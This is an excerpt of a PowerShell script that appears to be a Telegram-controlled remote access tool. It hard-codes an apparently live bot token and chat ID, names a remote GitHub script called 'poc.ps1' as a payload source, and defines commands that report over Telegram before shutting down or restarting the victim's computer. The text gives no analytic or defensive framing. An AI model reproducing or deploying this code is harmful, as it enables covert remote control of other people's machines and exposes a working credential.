...
$BotToken = "5640930631:AAG3t8hvVvupj3mGX-ezWMWBGh1PYQSeYDA"
$ChatID = '5365373847'
$githubScript = 'https://raw.githubusercontent.com/zyzyyyyzz/zyzyzyzyzzzz/main/poc.ps1'
...
function turnoffpc {
    Send-Message "Turning OFF.."
    Stop-Computer
}

function restartpc {
    Send-Message "Restarting PC.."
    Restart-Computer
}
